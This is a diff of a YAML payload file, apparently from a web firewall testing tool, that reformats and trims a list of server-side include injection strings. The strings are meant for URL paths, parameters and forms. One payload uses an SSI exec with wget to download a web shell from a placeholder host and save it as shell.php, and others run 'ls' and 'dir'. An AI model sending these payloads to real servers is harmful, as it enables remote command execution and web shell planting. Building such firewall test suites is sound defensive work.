@@ -1,17 +1,13 @@
----
-payload:
-  - '<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->'
-  - '<!--#echo var="DOCUMENT_URI" -->'
-  - '<!--#exec cmd="ls" -->'
-  - '<!--#exec cmd="dir" -->'
-  - '<!--#include file=”UUUUUUUU...UU”-->'
 encoder:
-  - Base64Flat
-  - URL
+- Base64Flat
+- URL
+payload:
+- <!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->
+- <!--#exec cmd="ls" -->
+- <!--#exec cmd="dir" -->
 placeholder:
-  - URLPath
-  - URLParam
-  - HTMLForm
-  - HTMLMultipartForm
-type: "SS Injection"
-...
+- URLPath
+- URLParam
+- HTMLForm
+- HTMLMultipartForm
+type: SS Injection
